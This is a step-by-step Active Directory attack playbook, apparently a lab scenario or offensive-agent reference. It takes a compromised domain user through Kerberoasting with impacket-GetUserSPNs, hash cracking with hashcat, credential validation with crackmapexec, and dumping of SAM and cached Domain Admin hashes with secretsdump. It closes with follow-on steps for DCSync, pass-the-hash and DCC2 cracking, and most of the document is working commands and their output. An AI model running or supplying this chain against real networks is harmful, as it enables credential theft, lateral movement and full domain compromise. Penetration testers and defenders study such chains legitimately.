# Kerberoasting to Domain Admin Chain

## Scenario
Domain user `jsmith` compromised on MEGACORP.LOCAL domain.

## Step 1: Find Kerberoastable Accounts
```bash
$ impacket-GetUserSPNs MEGACORP.LOCAL/jsmith:'W1nt3r2025!' -dc-ip 10.10.10.100 -request

ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
----------------------------------  ----------  ----------------------------------------------------  -------------------
MSSQLSvc/sql01.megacorp.local:1433  svc_sql     CN=IT Operations,OU=Groups,DC=megacorp,DC=local      2024-03-15 09:22:11
HTTP/web01.megacorp.local           svc_web     CN=Web Admins,OU=Groups,DC=megacorp,DC=local          2023-11-20 14:05:33
CIFS/file01.megacorp.local          svc_backup  CN=Backup Operators,OU=Groups,DC=megacorp,DC=local    2024-08-01 11:30:45

$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$MSSQLSvc/sql01.megacorp.local:1433*$a8f23b...
$krb5tgs$23$*svc_web$MEGACORP.LOCAL$HTTP/web01.megacorp.local*$c4d92e...
$krb5tgs$23$*svc_backup$MEGACORP.LOCAL$CIFS/file01.megacorp.local*$f1a83c...
```

## Step 2: Crack TGS Hashes
```bash
$ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

$krb5tgs$23$*svc_sql$MEGACORP.LOCAL*:SqlServer2024!
$krb5tgs$23$*svc_web$MEGACORP.LOCAL*:WebApp#2023
$krb5tgs$23$*svc_backup$MEGACORP.LOCAL*:<not cracked>

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: kerberoast_hashes.txt
Time.Started.....: Wed Jan 15 16:30:00 2025 (3 min, 22 sec)
Recovered........: 2/3 (66.67%) Digests
```

## Step 3: Validate Cracked Credentials
```bash
$ crackmapexec smb 10.10.10.100 -u svc_sql -p 'SqlServer2024!' -d MEGACORP.LOCAL
SMB   10.10.10.100  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:MEGACORP.LOCAL)
SMB   10.10.10.100  445  DC01  [+] MEGACORP.LOCAL\svc_sql:SqlServer2024!

$ crackmapexec smb 10.10.10.100 -u svc_web -p 'WebApp#2023' -d MEGACORP.LOCAL
SMB   10.10.10.100  445  DC01  [+] MEGACORP.LOCAL\svc_web:WebApp#2023
```

## Step 4: Check for DA Path
```bash
# svc_sql is in IT Operations — check if that group has interesting permissions
$ crackmapexec smb 10.10.10.101 -u svc_sql -p 'SqlServer2024!' -d MEGACORP.LOCAL --shares
SMB   10.10.10.101  445  SQL01  [*] Windows Server 2019 (name:SQL01) (domain:MEGACORP.LOCAL)
SMB   10.10.10.101  445  SQL01  [+] MEGACORP.LOCAL\svc_sql:SqlServer2024! (Pwn3d!)
SMB   10.10.10.101  445  SQL01  [*] Enumerated shares
ADMIN$  READ,WRITE   Remote Admin
C$      READ,WRITE   Default share
SYSVOL  READ         Logon server share

# Local admin on SQL01! Dump creds
$ impacket-secretsdump MEGACORP.LOCAL/svc_sql:'SqlServer2024!'@10.10.10.101
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a5c3b4a2f7e8d9b...:::
[*] Dumping cached domain logon information
MEGACORP.LOCAL/dbadmin:$DCC2$10240#dbadmin#a8f2b3c4d5e6f7a8...
MEGACORP.LOCAL/Administrator:$DCC2$10240#Administrator#b9e3c4d5f6a7b8c9...
```

## Evidence
- 3 Kerberoastable SPNs found, 2 passwords cracked
- svc_sql is local admin on SQL01
- Cached Domain Admin credentials on SQL01
- Full attack path: jsmith → Kerberoast → svc_sql → SQL01 admin → cached DA creds

## Next Steps
→ **privilege_escalation skill**: DCSync with cached DA hash if crackable
→ **lateral_movement skill**: PTH with svc_sql admin hash to other hosts
→ **credential_access skill**: Crack DCC2 cached hashes (hashcat -m 2100)
